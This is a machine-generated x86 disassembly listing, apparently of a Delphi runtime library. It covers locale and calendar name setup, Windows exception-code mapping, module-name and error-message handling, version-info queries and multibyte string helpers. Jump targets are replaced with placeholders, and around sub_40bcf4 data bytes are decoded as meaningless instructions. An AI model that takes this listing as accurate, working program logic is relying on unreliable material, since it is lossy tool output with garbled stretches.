cmp [ ebx ] 0x0
jne r-xdata
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn 0x8
mov eax [ ebp - 0x4 ]
mov eax [ eax + edi * 4 ]
mov edx ebx
call sub_405e08
sub_40b3d0
push ebp
mov ebp esp
xor ecx ecx
push ecx
push ecx
push ecx
push ecx
push ecx
push ecx
push ebx
push esi
push edi
xor eax eax
push ebp
push sub_40b4e3
push [ fs : eax ]
mov [ fs : eax ] esp
call GetThreadLocale
mov [ ebp - 0x4 ] eax
mov ebx 0x1
mov esi rw-data
mov edi rw-data
push ebp
push 0xb
lea eax [ ebp - 0xc ]
push eax
mov ecx rw-data
mov edx ebx
dec edx
lea eax [ ebx + 0x44 ]
dec eax
call sub_40b394
pop ecx
mov edx [ ebp - 0xc ]
mov eax esi
call sub_404100
push ebp
push 0xb
lea eax [ ebp - 0x10 ]
push eax
mov ecx rw-data
mov edx ebx
dec edx
lea eax [ ebx + 0x38 ]
dec eax
call sub_40b394
pop ecx
mov edx [ ebp - 0x10 ]
mov eax edi
call sub_404100
inc ebx
add edi 0x4
add esi 0x4
cmp ebx 0xd
jne r-xdata
mov ebx 0x1
mov esi rw-data
mov edi rw-data
lea eax [ ebx + 0x5 ]
mov ecx 0x7
cdq
idiv ecx
mov [ ebp - 0x8 ] edx
push ebp
push 0x6
lea eax [ ebp - 0x14 ]
push eax
mov ecx rw-data
mov edx ebx
dec edx
mov eax [ ebp - 0x8 ]
add eax 0x31
call sub_40b394
pop ecx
mov edx [ ebp - 0x14 ]
mov eax esi
call sub_404100
push ebp
push 0x6
lea eax [ ebp - 0x18 ]
push eax
mov ecx rw-data
mov edx ebx
dec edx
mov eax [ ebp - 0x8 ]
add eax 0x2a
call sub_40b394
pop ecx
mov edx [ ebp - 0x18 ]
mov eax edi
call sub_404100
inc ebx
add edi 0x4
add esi 0x4
cmp ebx 0x8
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_40b4ea
lea eax [ ebp - 0x18 ]
mov edx 0x4
call sub_4040d0
retn
sub_40b4f4
push ebp
mov ebp esp
push ebx
push esi
xor esi esi
mov ebx 0x1
jmp r-xdata
cmp [ ebx * 4 + rw-data ] 0x0
jne r-xdata
cmp ebx 0x7
je r-xdata
lea eax [ ebx * 4 + rw-data ]
mov edx [ ebp + 0x8 ]
call sub_4042a4
mov esi 0x1
mov eax esi
pop esi
pop ebx
pop ebp
retn 0x4
inc ebx
sub_40b530
push ebp
mov ebp esp
push 0x0
push ebx
push esi
xor eax eax
push ebp
push sub_40b595
push [ fs : eax ]
mov [ fs : eax ] esp
xor esi esi
mov ebx 0x1
jmp r-xdata
cmp [ ebx * 4 + rw-data ] 0xffffffff
jne r-xdata
cmp ebx 0x7
je r-xdata
lea eax [ ebp - 0x4 ]
mov edx [ ebp + 0x8 ]
call sub_4042a4
mov eax [ ebp - 0x4 ]
xor edx edx
call sub_408400
mov [ ebx * 4 + rw-data ] eax
mov esi 0x1
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_40b59c
lea eax [ ebp - 0x4 ]
call sub_4040ac
retn
inc ebx
sub_40b5a8
push ebp
mov ebp esp
push 0x0
push esi
xor eax eax
push ebp
push sub_40b63f
push [ fs : eax ]
mov [ fs : eax ] esp
lea eax [ ebp - 0x4 ]
push eax
call GetThreadLocale
mov ecx r-xdata
mov edx 0x100b
call sub_40b320
mov eax [ ebp - 0x4 ]
mov edx 0x1
call sub_408400
mov esi eax
mov eax esi
add eax 0xfffffffd
sub eax 0x3
jae r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_40b646
lea eax [ ebp - 0x4 ]
call sub_4040ac
retn
push 0x4
push esi
call GetThreadLocale
push eax
push sub_40b4f4
call EnumCalendarInfoA
mov edx 0x7
mov eax rw-data
mov [ eax ] 0xffffffff
add eax 0x4
dec edx
jne r-xdata
push 0x3
push esi
call GetThreadLocale
push eax
push sub_40b530
call EnumCalendarInfoA
sub_40b658
push ebp
mov ebp esp
xor ecx ecx
push ecx
push ecx
push ecx
push ecx
push ecx
push ebx
push esi
push edi
mov edi edx
mov esi eax
xor eax eax
push ebp
push sub_40b822
push [ fs : eax ]
mov [ fs : eax ] esp
mov ebx 0x1
mov eax edi
call sub_4040ac
lea eax [ ebp - 0x8 ]
push eax
call GetThreadLocale
mov ecx r-xdata
mov edx 0x1009
call sub_40b320
mov eax [ ebp - 0x8 ]
mov edx 0x1
call sub_408400
add eax 0xfffffffd
sub eax 0x3
jb r-xdata
mov eax esi
call sub_40436c
cmp ebx eax
jle r-xdata
mov eax [ rw-data ]
sub eax 0x4
je r-xdata
mov al [ esi + ebx - 0x1 ]
and eax 0xff
bt [ rw-data ] eax
jae r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_40b829
lea eax [ ebp - 0x14 ]
mov edx 0x4
call sub_4040d0
retn
mov al 0x1
add eax 0xfffffff3
sub eax 0x2
jb r-xdata
mov edx r-xdata
lea eax [ esi + ebx - 0x1 ]
mov ecx 0x2
call sub_408a48
test eax eax
jne r-xdata
mov edx ebx
mov eax esi
call sub_40c6c8
mov [ ebp - 0x4 ] eax
lea eax [ ebp - 0x10 ]
push eax
mov ecx [ ebp - 0x4 ]
mov edx ebx
mov eax esi
call sub_4045cc
mov edx [ ebp - 0x10 ]
mov eax edi
call sub_404374
add ebx [ ebp - 0x4 ]
jmp r-xdata
mov eax edi
mov edx esi
call sub_404100
jmp r-xdata
jmp r-xdata
xor eax eax
jmp r-xdata
mov edx r-xdata
lea eax [ esi + ebx - 0x1 ]
mov ecx 0x4
call sub_408a48
test eax eax
jne r-xdata
mov eax edi
mov edx r-xdata
call sub_404374
inc ebx
jmp r-xdata
mov eax esi
call sub_40436c
cmp ebx eax
jle r-xdata
test al al
je r-xdata
mov edx r-xdata
lea eax [ esi + ebx - 0x1 ]
mov ecx 0x2
call sub_408a48
test eax eax
jne r-xdata
mov eax edi
mov edx r-xdata
call sub_404374
add ebx 0x3
jmp r-xdata
inc ebx
mov al [ esi + ebx - 0x1 ]
sub al 0x47
je r-xdata
jmp r-xdata
mov al [ esi + ebx - 0x1 ]
sub al 0x59
je r-xdata
mov eax edi
mov edx r-xdata
call sub_404374
inc ebx
jmp r-xdata
inc ebx
sub al 0x20
je r-xdata
mov eax edi
mov edx r-xdata
call sub_404374
jmp r-xdata
sub al 0x20
jne r-xdata
lea eax [ ebp - 0xc ]
mov dl [ esi + ebx - 0x1 ]
call sub_404294
mov edx [ ebp - 0xc ]
mov eax edi
call sub_404374
lea eax [ ebp - 0x14 ]
mov dl [ esi + ebx - 0x1 ]
call sub_404294
mov edx [ ebp - 0x14 ]
mov eax edi
call sub_404374
sub_40b88c
push ebp
mov ebp esp
add esp 0xfffffba8
push ebx
push esi
push edi
mov [ ebp - 0x4 ] ecx
mov ebx edx
mov esi eax
push 0x1c
lea eax [ ebp - 0x330 ]
push eax
push ebx
call VirtualQuery
cmp [ ebp - 0x320 ] 0x1000
jne r-xdata
push 0x105
lea eax [ ebp - 0x212 ]
push eax
mov eax [ rw-data ]
push eax
call GetModuleFileNameA
mov eax ebx
call sub_40b880
mov [ ebp - 0x8 ] eax
jmp r-xdata
push 0x105
lea eax [ ebp - 0x212 ]
push eax
mov eax [ ebp - 0x32c ]
push eax
call GetModuleFileNameA
test eax eax
jne r-xdata
lea eax [ ebp - 0x212 ]
mov dl 0x5c
call sub_40c88c
mov edx eax
inc edx
lea eax [ ebp - 0x10d ]
mov ecx 0x104
call sub_40896c
mov ebx r-xdata
mov edi r-xdata
mov eax esi
mov edx [ r-xdata ]
call sub_40343c
test al al
je r-xdata
sub ebx [ ebp - 0x32c ]
mov [ ebp - 0x8 ] ebx
push 0x100
lea eax [ ebp - 0x312 ]
push eax
mov eax [ rw-data ]
mov eax [ eax + 0x4 ]
push eax
mov eax [ rw-data ]
call sub_405374
push eax
call LoadStringA
lea edx [ ebp - 0x458 ]
mov eax [ esi ]
call sub_403200
lea eax [ ebp - 0x458 ]
mov [ ebp - 0x358 ] eax
mov [ ebp - 0x354 ] 0x4
lea eax [ ebp - 0x10d ]
mov [ ebp - 0x350 ] eax
mov [ ebp - 0x34c ] 0x6
mov eax [ ebp - 0x8 ]
mov [ ebp - 0x348 ] eax
mov [ ebp - 0x344 ] 0x5
mov [ ebp - 0x340 ] ebx
mov [ ebp - 0x33c ] 0x6
mov [ ebp - 0x338 ] edi
mov [ ebp - 0x334 ] 0x6
lea eax [ ebp - 0x358 ]
push eax
push 0x4
lea ecx [ ebp - 0x312 ]
mov edx [ ebp + 0x8 ]
mov eax [ ebp - 0x4 ]
call sub_408fa4
mov eax [ ebp - 0x4 ]
call sub_408908
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
mov eax [ esi + 0x4 ]
call sub_40456c
mov ebx eax
mov eax ebx
call sub_408908
test eax eax
je r-xdata
cmp [ ebx + eax - 0x1 ] 0x2e
je r-xdata
mov edi r-xdata
sub_40ba14
add esp 0xfffffbbc
push 0x400
lea ecx [ esp + 0x48 ]
call sub_40b88c
mov eax [ rw-data ]
cmp [ eax ] 0x0
je r-xdata
push 0x40
lea eax [ esp + 0x8 ]
push eax
mov eax [ rw-data ]
mov eax [ eax + 0x4 ]
push eax
mov eax [ rw-data ]
call sub_405374
push eax
call LoadStringA
push 0x2010
lea eax [ esp + 0x8 ]
push eax
lea eax [ esp + 0x4c ]
push eax
push 0x0
call MessageBoxA
mov eax [ rw-data ]
call sub_402b50
call sub_402854
lea eax [ esp + 0x44 ]
push eax
lea eax [ esp + 0x48 ]
push eax
call CharToOemA
push 0x0
lea eax [ esp + 0x4 ]
push eax
lea eax [ esp + 0x4c ]
call sub_408908
push eax
lea eax [ esp + 0x50 ]
push eax
push 0xfffffff4
call GetStdHandle
push eax
call WriteFile
push 0x0
lea eax [ esp + 0x4 ]
push eax
push 0x2
push r-xdata
push 0xfffffff4
call GetStdHandle
push eax
call WriteFile
jmp r-xdata
add esp 0x444
retn
sub_40badc
push ebx
push esi
push edi
test dl dl
je r-xdata
mov esi ecx
mov ebx edx
mov edi eax
lea eax [ edi + 0x4 ]
mov edx esi
call sub_404100
mov eax edi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_4035fc
mov eax edi
pop edi
pop esi
pop ebx
retn
call sub_403654
pop [ fs : 0x0 ]
add esp 0xc
sub_40bb18
push ebp
mov ebp esp
push 0x0
push ebx
push esi
push edi
test dl dl
je r-xdata
mov esi ecx
mov ebx edx
mov edi eax
xor eax eax
push ebp
push sub_40bb72
push [ fs : eax ]
mov [ fs : eax ] esp
lea eax [ ebp - 0x4 ]
push eax
mov edx [ ebp + 0xc ]
mov ecx [ ebp + 0x8 ]
mov eax esi
call sub_408fe4
mov edx [ ebp - 0x4 ]
lea eax [ edi + 0x4 ]
call sub_404100
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_40bb79
lea eax [ ebp - 0x4 ]
call sub_4040ac
retn
add esp 0xfffffff0
call sub_4035fc
sub_40bb79
mov eax edi
test bl bl
je r-xdata
mov eax edi
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn 0x8
call sub_403654
pop [ fs : 0x0 ]
add esp 0xc
sub_40bb98
push ebx
push esi
push edi
test dl dl
je r-xdata
mov esi ecx
mov ebx edx
mov edi eax
lea edx [ edi + 0x4 ]
mov eax esi
call sub_405e08
mov eax edi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_4035fc
mov eax edi
pop edi
pop esi
pop ebx
retn
call sub_403654
pop [ fs : 0x0 ]
add esp 0xc
sub_40bbd4
push ebp
mov ebp esp
push 0x0
push 0x0
push ebx
push esi
push edi
test dl dl
je r-xdata
mov esi ecx
mov ebx edx
mov edi eax
xor eax eax
push ebp
push sub_40bc40
push [ fs : eax ]
mov [ fs : eax ] esp
lea eax [ ebp - 0x4 ]
push eax
lea edx [ ebp - 0x8 ]
mov eax esi
call sub_405e08
mov eax [ ebp - 0x8 ]
mov edx [ ebp + 0xc ]
mov ecx [ ebp + 0x8 ]
call sub_408fe4
mov edx [ ebp - 0x4 ]
lea eax [ edi + 0x4 ]
call sub_404100
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_40bc47
lea eax [ ebp - 0x8 ]
mov edx 0x2
call sub_4040d0
retn
add esp 0xfffffff0
call sub_4035fc
sub_40bc47
mov eax edi
test bl bl
je r-xdata
mov eax edi
pop edi
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn 0x8
call sub_403654
pop [ fs : 0x0 ]
add esp 0xc
sub_40bc94
push ebx
push esi
add esp 0xfffffff8
xor ebx ebx
call sub_4028c8
mov esi eax
jmp r-xdata
cmp ebx 0x6
jg r-xdata
cmp ebx 0x6
jg r-xdata
cmp esi [ ebx * 8 + rw-data ]
jne r-xdata
mov [ esp ] esi
mov [ esp + 0x4 ] 0x0
push esp
push 0x0
mov ecx [ rw-data ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40bbd4
mov ecx [ ebx * 8 + rw-data ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40badc
jmp r-xdata
inc ebx
mov [ eax + 0xc ] esi
pop ecx
pop edx
pop esi
pop ebx
retn
sub_40bcf4
clc
mov esp 0xa0e0040
push esp
inc ebp
js r-xdata
jge r-xdata
jo r-xdata
[ ebx - 0x3d ]
mov eax eax
loopne r-xdata
push edx
je r-xdata
pop ebp
cld
mov edi ecx
mov esi edx
mov ebx eax
xor eax eax
push ebp
push sub_40be04
push [ fs : eax ]
mov [ fs : eax ] esp
test ebx ebx
je r-xdata
mov edx [ rw-data ]
jmp r-xdata
dec dl
je r-xdata
pop es
arpl [ gs : eax ] cx
add [ eax ] al
add [ ecx ] al
add [ eax ] al
add [ eax + edx + 0x40040 ] dl
add [ eax ] al
push ebx
mov ebx edx
mov edx eax
dec dl
je r-xdata
lea edx [ ebp - 0x4 ]
mov eax [ rw-data ]
call sub_405e08
lea eax [ ebp - 0x4 ]
mov edx ebx
call sub_404144
jmp r-xdata
push ebx
mov eax edx
jmp sub_403a64
mov edx [ rw-data ]
jmp r-xdata
dec edx
sub dl 0x16
jb r-xdata
mov eax [ ebp - 0x4 ]
mov [ ebp - 0x1c ] eax
mov [ ebp - 0x18 ] 0xb
mov [ ebp - 0x14 ] esi
mov [ ebp - 0x10 ] 0xb
mov [ ebp - 0xc ] edi
mov [ ebp - 0x8 ] 0x0
lea eax [ ebp - 0x1c ]
push eax
push 0x2
lea edx [ ebp - 0x20 ]
mov eax [ rw-data ]
call sub_405e08
mov ecx [ ebp - 0x20 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40bb18
mov ebx eax
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_40be0b
lea eax [ ebp - 0x20 ]
call sub_4040ac
lea eax [ ebp - 0x4 ]
call sub_4040ac
retn
and eax 0xff
lea eax [ eax * 8 + rw-data ]
mov ecx [ eax + 0x4 ]
mov eax [ eax ]
mov dl 0x1
call sub_40badc
mov edx eax
jmp r-xdata
jmp r-xdata
call sub_40bc94
mov edx eax
sub_40bd68
push ebp
mov ebp esp
add esp 0xffffffe0
push ebx
push esi
push edi
xor ebx ebx
mov [ ebp - 0x20 ] ebx
mov [ ebp - 0x4 ] ebx
mov edi ecx
mov esi edx
mov ebx eax
xor eax eax
push ebp
push sub_40be04
push [ fs : eax ]
mov [ fs : eax ] esp
test ebx ebx
je r-xdata
lea edx [ ebp - 0x4 ]
mov eax [ rw-data ]
call sub_405e08
lea eax [ ebp - 0x4 ]
mov edx ebx
call sub_404144
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov [ ebp - 0x1c ] eax
mov [ ebp - 0x18 ] 0xb
mov [ ebp - 0x14 ] esi
mov [ ebp - 0x10 ] 0xb
mov [ ebp - 0xc ] edi
mov [ ebp - 0x8 ] 0x0
lea eax [ ebp - 0x1c ]
push eax
push 0x2
lea edx [ ebp - 0x20 ]
mov eax [ rw-data ]
call sub_405e08
mov ecx [ ebp - 0x20 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40bb18
mov ebx eax
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_40be0b
lea eax [ ebp - 0x20 ]
call sub_4040ac
lea eax [ ebp - 0x4 ]
call sub_4040ac
retn
sub_40be58
mov eax [ eax ]
cmp eax 0xc0000092
jg r-xdata
cmp eax 0xc0000096
jg r-xdata
je r-xdata
sub eax 0xc00000fd
je r-xdata
je r-xdata
mov al 0x6
retn
cmp eax 0xc000008e
jg r-xdata
mov al 0xe
retn
sub eax 0x3d
je r-xdata
mov al 0xc
retn
sub eax 0xc0000093
je r-xdata
add eax 0x3fffff71
sub eax 0x2
jb r-xdata
je r-xdata
mov al 0xd
retn
jmp r-xdata
mov al 0x9
retn
dec eax
je r-xdata
je r-xdata
mov al 0x7
retn
sub eax 0xc0000005
je r-xdata
mov al 0x16
retn
mov al 0x3
retn
dec eax
je r-xdata
mov al 0x8
retn
jmp r-xdata
mov al 0xb
retn
sub eax 0x87
je r-xdata
mov al 0x5
retn
jmp r-xdata
mov al 0x4
retn
dec eax
je r-xdata
jmp r-xdata
sub_40bef0
push ebp
mov ebp esp
add esp 0xfffffe90
push ebx
push esi
xor eax eax
mov [ ebp - 0x170 ] eax
mov [ ebp - 0x14c ] eax
mov [ ebp - 0x154 ] eax
mov [ ebp - 0x150 ] eax
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_40c0ab
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp + 0x8 ]
mov ebx [ eax - 0x4 ]
cmp [ ebx + 0x14 ] 0x0
jne r-xdata
lea edx [ ebp - 0x4 ]
mov eax [ rw-data ]
call sub_405e08
lea edx [ ebp - 0x4 ]
mov eax [ rw-data ]
call sub_405e08
jmp r-xdata
mov eax [ ebx + 0xc ]
mov [ ebp - 0x16c ] eax
mov [ ebp - 0x168 ] 0x5
mov eax [ ebp - 0x4 ]
mov [ ebp - 0x164 ] eax
mov [ ebp - 0x160 ] 0xb
mov [ ebp - 0x15c ] esi
mov [ ebp - 0x158 ] 0x5
lea eax [ ebp - 0x16c ]
push eax
push 0x2
lea edx [ ebp - 0x170 ]
mov eax [ rw-data ]
call sub_405e08
mov ecx [ ebp - 0x170 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40bb18
mov ebx eax
push 0x105
lea eax [ ebp - 0x125 ]
push eax
mov eax [ ebp - 0x1c ]
push eax
call GetModuleFileNameA
test eax eax
je r-xdata
mov esi [ ebx + 0x18 ]
push 0x1c
lea eax [ ebp - 0x20 ]
push eax
mov eax [ ebx + 0xc ]
push eax
call VirtualQuery
cmp [ ebp - 0x10 ] 0x1000
jne r-xdata
mov eax [ ebx + 0xc ]
mov [ ebp - 0x148 ] eax
mov [ ebp - 0x144 ] 0x5
lea eax [ ebp - 0x150 ]
lea edx [ ebp - 0x125 ]
mov ecx 0x105
call sub_40431c
mov eax [ ebp - 0x150 ]
lea edx [ ebp - 0x14c ]
call sub_408820
mov eax [ ebp - 0x14c ]
mov [ ebp - 0x140 ] eax
mov [ ebp - 0x13c ] 0xb
mov eax [ ebp - 0x4 ]
mov [ ebp - 0x138 ] eax
mov [ ebp - 0x134 ] 0xb
mov [ ebp - 0x130 ] esi
mov [ ebp - 0x12c ] 0x5
lea eax [ ebp - 0x148 ]
push eax
push 0x3
lea edx [ ebp - 0x154 ]
mov eax [ rw-data ]
call sub_405e08
mov ecx [ ebp - 0x154 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40bb18
mov ebx eax
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_40c0b2
lea eax [ ebp - 0x170 ]
call sub_4040ac
lea eax [ ebp - 0x154 ]
mov edx 0x3
call sub_4040d0
lea eax [ ebp - 0x4 ]
call sub_4040ac
retn
sub_40c0bc
push ebp
mov ebp esp
add esp 0xfffffff0
push ebx
xor edx edx
mov [ ebp - 0x10 ] edx
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_40c177
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
call sub_40be58
and eax 0xff
mov edx eax
add edx 0xfffffffd
sub edx 0x8
jb r-xdata
lea eax [ eax * 8 + rw-data ]
mov ecx [ eax + 0x4 ]
mov eax [ eax ]
mov dl 0x1
call sub_40badc
mov ebx eax
jmp r-xdata
je r-xdata
mov eax ebx
mov edx [ r-xdata ]
call sub_40343c
test al al
je r-xdata
push ebp
call sub_40bef0
pop ecx
mov ebx eax
jmp r-xdata
dec edx
sub edx 0xa
jae r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_40c17e
lea eax [ ebp - 0x10 ]
call sub_4040ac
retn
mov eax [ ebp - 0x4 ]
mov [ ebx + 0xc ] eax
mov eax [ ebp - 0x4 ]
mov eax [ eax ]
mov [ ebp - 0xc ] eax
mov [ ebp - 0x8 ] 0x0
lea eax [ ebp - 0xc ]
push eax
push 0x0
lea edx [ ebp - 0x10 ]
mov eax [ rw-data ]
call sub_405e08
mov ecx [ ebp - 0x10 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40bb18
mov ebx eax
sub_40c198
mov ecx [ rw-data ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40bb98
mov [ rw-data ] eax
mov ecx [ rw-data ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40bb98
mov [ rw-data ] eax
mov eax [ rw-data ]
mov [ eax ] r-xdata
mov eax [ rw-data ]
mov [ eax ] sub_40c188
mov eax [ rw-data ]
mov edx [ r-xdata ]
mov [ eax ] edx
mov eax [ rw-data ]
mov [ eax ] sub_40bed8
mov eax [ rw-data ]
mov [ eax ] sub_40c0bc
mov eax sub_40be24
mov edx [ rw-data ]
mov [ edx ] eax
mov eax sub_40be40
mov edx [ rw-data ]
mov [ edx ] eax
retn
sub_40c21c
cmp [ rw-data ] 0x0
je r-xdata
cmp [ rw-data ] 0x0
je r-xdata
mov eax [ rw-data ]
mov [ eax + 0xc ] 0x1
mov eax [ rw-data ]
mov edx [ eax ]
call [ edx - 0x8 ]
xor eax eax
mov [ rw-data ] eax
mov eax [ rw-data ]
xor edx edx
mov [ eax ] edx
mov eax [ rw-data ]
xor edx edx
mov [ eax ] edx
mov eax [ rw-data ]
xor edx edx
mov [ eax ] edx
mov eax [ rw-data ]
xor edx edx
mov [ eax ] edx
mov eax [ rw-data ]
xor edx edx
mov [ eax ] edx
mov eax [ rw-data ]
xor edx edx
mov [ eax ] edx
retn
mov eax [ rw-data ]
mov [ eax + 0xc ] 0x1
mov eax [ rw-data ]
call sub_4032b0
xor eax eax
mov [ rw-data ] eax
sub_40c29c
add esp 0xffffff6c
mov [ esp ] 0x94
push esp
call GetVersionExA
test eax eax
je r-xdata
add esp 0x94
retn
mov eax [ esp + 0x10 ]
mov [ rw-data ] eax
mov eax [ esp + 0x4 ]
mov [ rw-data ] eax
mov eax [ esp + 0x8 ]
mov [ rw-data ] eax
cmp [ rw-data ] 0x1
jne r-xdata
mov eax [ esp + 0xc ]
mov [ rw-data ] eax
mov eax [ esp + 0xc ]
and eax 0xffff
mov [ rw-data ] eax
jmp r-xdata
mov eax rw-data
lea edx [ esp + 0x14 ]
mov ecx 0x80
call sub_40431c
sub_40c32c
push ebp
mov ebp esp
add esp 0xffffffe8
push ebx
xor edx edx
mov [ ebp - 0x8 ] edx
mov ebx eax
xor eax eax
push ebp
push sub_40c402
push [ fs : eax ]
mov [ fs : eax ] esp
mov [ ebp - 0x4 ] 0xffffffff
lea eax [ ebp - 0x8 ]
mov edx ebx
call sub_404144
lea eax [ ebp - 0x8 ]
call j_sub_404578#2
lea eax [ ebp - 0xc ]
push eax
mov eax [ ebp - 0x8 ]
call sub_40456c
push eax
call GetFileVersionInfoSizeA
mov ebx eax
test ebx ebx
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_40c409
lea eax [ ebp - 0x8 ]
call sub_4040ac
retn
mov eax ebx
call sub_4026ec
mov [ ebp - 0x10 ] eax
xor eax eax
push ebp
push sub_40c3e5
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x10 ]
push eax
push ebx
mov eax [ ebp - 0xc ]
push eax
mov eax [ ebp - 0x8 ]
call sub_40456c
push eax
call GetFileVersionInfoA
test eax eax
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x10 ]
call sub_40270c
retn
lea eax [ ebp - 0x18 ]
push eax
lea eax [ ebp - 0x14 ]
push eax
push r-xdata
mov eax [ ebp - 0x10 ]
push eax
call VerQueryValueA
test eax eax
je r-xdata
mov eax [ ebp - 0x14 ]
mov eax [ eax + 0x8 ]
mov [ ebp - 0x4 ] eax
sub_40c418
push esi
push edi
mov edi edx
xor edx edx
test eax eax
je r-xdata
mov eax edx
pop edi
pop esi
retn
cmp [ eax + edi ] 0x0
je r-xdata
test edi edi
jne r-xdata
mov esi edi
dec esi
jmp r-xdata
mov al [ eax ]
and eax 0xff
bt [ rw-data ] eax
jae r-xdata
test esi esi
jl r-xdata
mov dl 0x1
jmp r-xdata
mov ecx edi
sub ecx esi
and ecx 0x80000001
jns r-xdata
mov cl [ eax + esi ]
and ecx 0xff
bt [ rw-data ] ecx
jb r-xdata
test ecx ecx
jne r-xdata
dec ecx
or ecx 0xfffffffe
inc ecx
dec esi
mov al [ eax + edi ]
and eax 0xff
bt [ rw-data ] eax
jae r-xdata
mov dl 0x2
jmp r-xdata
mov dl 0x1
sub_40c490
push ebx
push esi
mov esi edx
mov ebx eax
xor eax eax
cmp [ rw-data ] 0x0
je r-xdata
pop esi
pop ebx
retn
mov eax ebx
call sub_40456c
mov edx esi
dec edx
call sub_40c418
sub_40c4cc
push ebx
push esi
mov esi edx
mov ebx eax
mov eax ebx
call sub_40436c
cmp esi eax
jle r-xdata
mov edx esi
mov eax ebx
call sub_40c4f4
pop esi
pop ebx
retn
mov eax ebx
call sub_40436c
mov esi eax
sub_40c4f4
push ebx
push esi
push edi
mov esi edx
mov ebx eax
xor edi edi
test esi esi
jle r-xdata
mov eax edi
pop edi
pop esi
pop ebx
retn
mov eax ebx
call sub_40436c
cmp esi eax
jg r-xdata
mov edi esi
cmp [ rw-data ] 0x0
je r-xdata
mov eax 0x1
xor edi edi
cmp esi eax
jl r-xdata
mov dl [ ebx + eax - 0x1 ]
and edx 0xff
bt [ rw-data ] edx
jae r-xdata
inc eax
mov edx eax
mov eax ebx
call sub_40c704
jmp r-xdata
inc edi
cmp esi eax
jge r-xdata
sub_40c54c
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
push esi
push edi
mov [ ebp - 0x8 ] ecx
mov [ ebp - 0x4 ] edx
mov edi eax
mov eax edi
call sub_40436c
mov [ ebp - 0xc ] eax
mov esi 0x1
mov ebx 0x1
jmp r-xdata
cmp ebx [ ebp - 0xc ]
jge r-xdata
cmp esi [ ebp - 0x4 ]
jne r-xdata
cmp esi [ ebp - 0x4 ]
jl r-xdata
mov eax [ ebp - 0x8 ]
mov [ eax ] esi
mov eax [ ebp + 0x8 ]
mov [ eax ] ebx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
cmp ebx [ ebp - 0xc ]
jge r-xdata
inc esi
mov al [ edi + ebx - 0x1 ]
and eax 0xff
bt [ rw-data ] eax
jae r-xdata
mov al [ edi + ebx - 0x1 ]
and eax 0xff
bt [ rw-data ] eax
jae r-xdata
inc ebx
mov edx ebx
mov eax edi
call sub_40c704
mov ebx eax
jmp r-xdata
mov edx ebx
mov eax edi
call sub_40c704
dec eax
mov ebx eax
sub_40c5dc
push ebx
push esi
add esp 0xfffffff8
mov ebx edx
mov esi eax
xor eax eax
mov [ esp ] eax
test ebx ebx
jle r-xdata
mov eax [ esp ]
pop ecx
pop edx
pop esi
pop ebx
retn
mov eax esi
call sub_40436c
cmp ebx eax
jg r-xdata
cmp ebx 0x1
jle r-xdata
mov [ esp ] ebx
cmp [ rw-data ] 0x0
je r-xdata
push esp
lea ecx [ esp + 0x8 ]
mov edx ebx
dec edx
mov eax esi
call sub_40c54c
dec ebx
cmp ebx [ esp + 0x4 ]
jg r-xdata
xor eax eax
mov [ esp ] eax
jmp r-xdata
mov eax esi
call sub_40436c
cmp eax [ esp ]
jg r-xdata
inc [ esp ]
jmp r-xdata
sub_40c640
push ebx
push esi
add esp 0xfffffff8
mov ebx edx
mov esi eax
xor eax eax
mov [ esp ] eax
test ebx ebx
jle r-xdata
mov eax [ esp ]
pop ecx
pop edx
pop esi
pop ebx
retn
mov eax esi
call sub_40436c
cmp ebx eax
jle r-xdata
cmp [ rw-data ] 0x0
je r-xdata
mov eax esi
call sub_40436c
mov ebx eax
mov [ esp ] ebx
push esp
lea ecx [ esp + 0x8 ]
mov edx ebx
mov eax esi
call sub_40c54c
mov eax esi
call sub_40436c
cmp eax [ esp ]
jge r-xdata
mov eax esi
call sub_40436c
mov [ esp ] eax
jmp r-xdata
sub_40c6c8
push ebx
push esi
mov esi edx
mov ebx eax
mov eax 0x1
cmp [ rw-data ] 0x0
je r-xdata
pop esi
pop ebx
retn
mov dl [ ebx + esi - 0x1 ]
and edx 0xff
bt [ rw-data ] edx
jae r-xdata
mov eax ebx
call sub_40456c
add eax esi
dec eax
call sub_40c6a0
sub_40c704
push ebx
push esi
mov ebx edx
mov esi eax
lea eax [ ebx + 0x1 ]
cmp [ rw-data ] 0x0
